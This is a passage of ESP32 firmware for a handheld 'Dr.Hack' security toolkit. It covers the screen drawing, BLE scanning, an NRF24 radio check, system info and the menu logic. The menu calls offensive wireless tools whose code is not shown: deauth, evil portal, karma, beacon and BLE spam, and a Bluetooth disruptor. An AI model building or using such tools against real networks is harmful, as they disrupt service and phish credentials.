    case 0x00E0: return "Google";
    case 0x0131: return "Xiaomi";
    case 0x0499: return "Espressif";
    case 0x0157: return "Fitbit";
    case 0x0087: return "Garmin";
    default: return "";
  }
}

static void dhDrawBleList() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), 0x051F, darkenColor(0x051F, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  char hdr[24];
  sprintf(hdr, "BLE [%d]", dhBleCount);
  tft.drawString(hdr, SCALE_X(4), SCALE_Y(2), 1);

  if (dhBleCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("No BLE devices", SCR_CX, SCR_CY, 1);
    return;
  }

  int listY = SCALE_Y(18);
  int rowH = SCALE_Y(26);

  for (int i = 0; i < DH_BLE_VISIBLE; i++) {
    int idx = i + dhBleScroll;
    if (idx >= dhBleCount) break;

    int y = listY + i * rowH;
    bool sel = (idx == dhBleCursor);
    DH_BleDevice& dev = dhBleDevices[idx];

    if (sel) {
      tft.fillRect(0, y, SCR_W, rowH - 1, CLR_SURFACE_2);
      tft.drawRect(0, y, SCR_W, rowH - 1, CLR_PRIMARY);
    }

    // Name or address
    String label = dev.name.length() > 0 ? dev.name : dev.address;
    tft.setTextColor(sel ? CLR_TEXT_HI : CLR_TEXT_MED);
    drawTruncatedText(SCALE_X(4), y + SCALE_Y(2), label.c_str(), SCR_W - SCALE_X(40), 
                      sel ? CLR_TEXT_HI : CLR_TEXT_MED, 1);

    // RSSI
    char rssiStr[10];
    sprintf(rssiStr, "%ddBm", dev.rssi);
    tft.setTextColor(dev.rssi > -65 ? CLR_SUCCESS : CLR_WARNING);
    tft.drawString(rssiStr, SCR_W - SCALE_X(36), y + SCALE_Y(2), 1);

    // Company + address on second line
    String company = dhCompanyName(dev.companyId);
    String meta = company.length() > 0 ? company : dev.address.substring(dev.address.length() - 8);
    tft.setTextColor(CLR_TEXT_LO);
    drawTruncatedText(SCALE_X(4), y + SCALE_Y(14), meta.c_str(), SCR_W - SCALE_X(8), CLR_TEXT_LO, 1);
  }

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("<:Scrl >:Scrl O:Back", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
}

static void dhRunBleScan() {
  tft.fillScreen(CLR_BG);
  tft.setTextColor(0x051F);
  tft.drawCentreString("Scanning BLE...", SCR_CX, SCR_CY - 10, 1);

  BLEDevice::init("");
  BLEScan* scan = BLEDevice::getScan();
  if (!scan) return;
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(80);

  BLEScanResults* results = scan->start(5, false);  // 5 second scan
  int n = results->getCount();
  if (n > DH_BLE_MAX) n = DH_BLE_MAX;

  dhBleCount = 0;
  for (int i = 0; i < n; i++) {
    BLEAdvertisedDevice d = results->getDevice(i);
    DH_BleDevice& out = dhBleDevices[dhBleCount++];
    out.name = d.haveName() ? String(d.getName().c_str()) : "";
    out.address = String(d.getAddress().toString().c_str());
    out.rssi = d.getRSSI();
    out.companyId = 0xFFFF;
    if (d.haveManufacturerData()) {
      String data = d.getManufacturerData();
      if (data.length() >= 2) {
        out.companyId = (uint8_t)data[0] | ((uint16_t)(uint8_t)data[1] << 8);
      }
    }
  }

  scan->clearResults();

  // Sort by RSSI
  for (int i = 0; i < dhBleCount - 1; i++) {
    for (int j = 0; j < dhBleCount - 1 - i; j++) {
      if (dhBleDevices[j].rssi < dhBleDevices[j + 1].rssi) {
        DH_BleDevice tmp = dhBleDevices[j];
        dhBleDevices[j] = dhBleDevices[j + 1];
        dhBleDevices[j + 1] = tmp;
      }
    }
  }

  dhBleCursor = 0;
  dhBleScroll = 0;
  dhDrawBleList();
}

// ═══════════════════════════════════════════════════════════
// TOOL: System Info
// Chip ID, MAC, heap, CPU freq, uptime
// ═══════════════════════════════════════════════════════════

void dhRunHwDiag() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("NRF TESTER", SCALE_X(4), SCALE_Y(2), 1);
  
  #ifdef ESP32
  pinMode(NRF1_CE_PIN, OUTPUT);
  pinMode(NRF1_CSN_PIN, OUTPUT);
  digitalWrite(NRF1_CE_PIN, LOW);
  digitalWrite(NRF1_CSN_PIN, HIGH);
  
  // Short delay for stability
  delay(10);
  
  // Read NRF24L01 CONFIG register (0x00)
  digitalWrite(NRF1_CSN_PIN, LOW);
  SPI.transfer(0x00); 
  uint8_t configReg = SPI.transfer(0xFF);
  digitalWrite(NRF1_CSN_PIN, HIGH);
  
  // Floating MISO usually returns 0x00 or 0xFF.
  bool passed = (configReg != 0x00 && configReg != 0xFF);
  
  tft.setTextColor(CLR_PRIMARY);
  tft.drawString("Primary NRF24", SCALE_X(4), SCALE_Y(20), 1);
  
  if (passed) {
    tft.setTextColor(CLR_SUCCESS);
    tft.drawString("STATUS: PASS", SCALE_X(4), SCALE_Y(35), 1);
    char buf[32];
    sprintf(buf, "Reg 0x00: 0x%02X", configReg);
    tft.drawString(buf, SCALE_X(4), SCALE_Y(50), 1);
    tft.drawString("Adapter Detected!", SCALE_X(4), SCALE_Y(65), 1);
  } else {
    tft.setTextColor(CLR_ERROR);
    tft.drawString("STATUS: FAIL", SCALE_X(4), SCALE_Y(35), 1);
    tft.drawString("Check SPI Wiring", SCALE_X(4), SCALE_Y(50), 1);
    tft.drawString("CE=32, CSN=33", SCALE_X(4), SCALE_Y(65), 1);
  }
  #endif

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Hold SELECT to exit", SCALE_X(4), SCR_H - SCALE_Y(14), 1);

  while (dhCurrentState == DH_HW_DIAG) {
    #ifdef ESP32
    extern void handleButtons(); handleButtons();
    extern ButtonState btnSelect;
    extern bool consumeLong(ButtonState&);
    if (consumeLong(btnSelect) || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false)) {
      break;
    }
    #else
    if (btnSelect() || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false)) break;
    #endif
    delay(50);
  }
}

static void dhDrawSysInfo() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_TEXT_MED, CLR_TEXT_LO, 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("SYSTEM INFO", SCALE_X(4), SCALE_Y(2), 1);

  int y = SCALE_Y(20);
  int lineH = SCALE_Y(14);
  char buf[40];

  // Chip ID
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Chip:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_HI);
  uint64_t chipId = ESP.getEfuseMac();
  sprintf(buf, "%04X%08X", (uint16_t)(chipId >> 32), (uint32_t)chipId);
  tft.drawString(buf, SCALE_X(40), y, 1);
  y += lineH;

  // CPU
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("CPU:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_PRIMARY);
  sprintf(buf, "%d MHz", ESP.getCpuFreqMHz());
  tft.drawString(buf, SCALE_X(40), y, 1);
  y += lineH;

  // Free Heap
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Heap:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_SUCCESS);
  sprintf(buf, "%d KB", ESP.getFreeHeap() / 1024);
  tft.drawString(buf, SCALE_X(40), y, 1);
  y += lineH;

  // Flash
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Flash:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_MED);
  sprintf(buf, "%d KB", ESP.getFlashChipSize() / 1024);
  tft.drawString(buf, SCALE_X(40), y, 1);
  y += lineH;

  // WiFi MAC
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("MAC:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawString(WiFi.macAddress().c_str(), SCALE_X(30), y, 1);
  y += lineH;

  // IP
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("IP:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawString(WiFi.localIP().toString().c_str(), SCALE_X(30), y, 1);
  y += lineH;

  // Uptime
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Up:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_MED);
  unsigned long sec = millis() / 1000;
  sprintf(buf, "%luh %lum %lus", sec / 3600, (sec % 3600) / 60, sec % 60);
  tft.drawString(buf, SCALE_X(30), y, 1);
  y += lineH;

  // Platform
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Board:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_SUCCESS);
  tft.drawString(PLATFORM_NAME, SCALE_X(40), y, 1);
  y += lineH;

  // Display
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Disp:", SCALE_X(4), y, 1);
  tft.setTextColor(CLR_TEXT_MED);
  sprintf(buf, "%dx%d ST7735R", SCREEN_W, SCREEN_H);
  tft.drawString(buf, SCALE_X(40), y, 1);

  // Footer
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
}

// ═══════════════════════════════════════════════════════════
// NAVIGATION FUNCTIONS (called from buttons.h)
// ═══════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════
// TOOL: About — Dr. Hack version info (8th grid cell)
// 🟡 GAP-07 FIX: Fills the empty 8th slot in 2×4 grid.
// ═══════════════════════════════════════════════════════════

static void dhDrawAbout() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("ABOUT", SCALE_X(4), SCALE_Y(2), 1);

  int y = SCALE_Y(22);
  int lineH = SCALE_Y(14);

  tft.setTextColor(CLR_PRIMARY);
  tft.drawCentreString("DR.HACK", SCR_CX, y, 2);
  y += SCALE_Y(20);

  tft.setTextColor(CLR_TEXT_MED);
  tft.drawCentreString("CompanionOS v7.0", SCR_CX, y, 1);
  y += lineH;

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawCentreString("Security Toolkit", SCR_CX, y, 1);
  y += lineH;

  drawSeparator(SCALE_X(10), y, SCR_W - SCALE_X(20), CLR_BORDER);
  y += SCALE_Y(8);

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("Tools: 48", SCALE_X(8), y, 1); y += lineH;
  tft.drawString("Platform: ESP32", SCALE_X(8), y, 1); y += lineH;

  char heapBuf[24];
  sprintf(heapBuf, "Free heap: %dKB", ESP.getFreeHeap() / 1024);
  tft.drawString(heapBuf, SCALE_X(8), y, 1); y += lineH;

  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("Use responsibly!", SCR_CX, y, 1);

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
}

void dhNavigate(int delta) {
  if (dhCurrentState == DH_MENU) {
    dhCursorIndex += delta;
    // Wrap within page
    if (dhCursorIndex < 0) {
      // Go to previous page
      if (dhMenuPage > 0) { dhMenuPage--; dhCursorIndex = DH_TOOLS_PER_PAGE - 1; }
      else { dhMenuPage = DH_MENU_PAGES - 1; dhCursorIndex = DH_TOOLS_PER_PAGE - 1; }
    }
    if (dhCursorIndex >= DH_TOOLS_PER_PAGE) {
      // Go to next page
      if (dhMenuPage < DH_MENU_PAGES - 1) { dhMenuPage++; dhCursorIndex = 0; }
      else { dhMenuPage = 0; dhCursorIndex = 0; }
    }
    dhDrawMenu();
  }
  else if (dhCurrentState == DH_WIFI_SCANNER) {
    dhNetCursor += delta;
    if (dhNetCursor < 0) dhNetCursor = dhNetCount - 1;
    if (dhNetCursor >= dhNetCount) dhNetCursor = 0;
    if (dhNetCursor < dhNetScroll) dhNetScroll = dhNetCursor;
    if (dhNetCursor >= dhNetScroll + DH_VISIBLE_LINES) dhNetScroll = dhNetCursor - DH_VISIBLE_LINES + 1;
    dhDrawNetList();
  }
  else if (dhCurrentState == DH_BT_SCANNER) {
    dhBleCursor += delta;
    if (dhBleCursor < 0) dhBleCursor = dhBleCount - 1;
    if (dhBleCursor >= dhBleCount) dhBleCursor = 0;
    if (dhBleCursor < dhBleScroll) dhBleScroll = dhBleCursor;
    if (dhBleCursor >= dhBleScroll + DH_BLE_VISIBLE) dhBleScroll = dhBleCursor - DH_BLE_VISIBLE + 1;
    dhDrawBleList();
  }
}

// Macro: run tool, return to menu
#define DH_RUN_TOOL(state, func) \
  dhCurrentState = state; func; dhCurrentState = DH_MENU; dhDrawMenu(); break;

// Macro: enter tool with own loop (user navigates within)
#define DH_ENTER_TOOL(state, func) \
  dhCurrentState = state; func; break;

void dhSelect() {
  if (dhCurrentState == DH_MENU) {
    int globalIdx = dhMenuPage * DH_TOOLS_PER_PAGE + dhCursorIndex;
    switch (globalIdx) {
      // Page 1: WiFi Tools
      case 0:  DH_ENTER_TOOL(DH_WIFI_SCANNER, dhRunWifiScan())
      case 1:  DH_RUN_TOOL(DH_CHANNEL_SCAN, dhRunChannelScan())
      case 2:  DH_RUN_TOOL(DH_WIFI_RADAR, dhRunWifiRadar())
      case 3:  DH_RUN_TOOL(DH_WIFI_DIRECTION, dhRunWifiDirection())
      case 4:  DH_RUN_TOOL(DH_BEACON_SPAM, dhRunBeaconSpam())
      case 5:  DH_RUN_TOOL(DH_DEAUTH, dhRunDeauth())
      case 6:  DH_RUN_TOOL(DH_EVIL_PORTAL, dhRunEvilPortal())
      case 7:  DH_RUN_TOOL(DH_PROBE_SNIFFER, dhRunProbeSniffer())

      // Page 2: WiFi+ & BLE
      case 8:  DH_RUN_TOOL(DH_KARMA, dhRunKarma())
      case 9:  DH_RUN_TOOL(DH_WIFI_CONFIG, dhRunWifiConfig())
      case 10: DH_ENTER_TOOL(DH_BT_SCANNER, dhRunBleScan())
      case 11: DH_RUN_TOOL(DH_BLE_INSPECTOR, dhRunBleInspector())
      case 12: DH_RUN_TOOL(DH_BLE_SPAM, dhRunBleSpam())
      case 13: DH_RUN_TOOL(DH_BT_DISRUPTOR, dhRunBtDisruptor())
      case 14: DH_ENTER_TOOL(DH_HW_DIAG, dhRunHwDiag())
      case 15: DH_RUN_TOOL(DH_WEB_DASHBOARD, dhRunWebDashboard())
    }
  }
  else {
    // SELECT in sub-tools returns to menu
    dhCurrentState = DH_MENU;
    dhDrawMenu();
  }
}

// ═══════════════════════════════════════════════════════════
// MAIN RENDER (called from pages.h renderCurrentPage)
// ═══════════════════════════════════════════════════════════

void redrawDrHackPartial() {
  if (dhCurrentState == DH_MENU) {
    dhDrawMenu();
  }
  // Sub-tools handle their own rendering
}

void initDrHack() {
  dhCurrentState = DH_MENU;
  dhCursorIndex = 0;
  dhMenuPage = 0;
  dhEntryScanline();
  dhDrawMenu();
}

void exitDrHack() {
  dhExitScanline();
}

#endif // ESP32
#endif // PAGE_DR_HACK_H
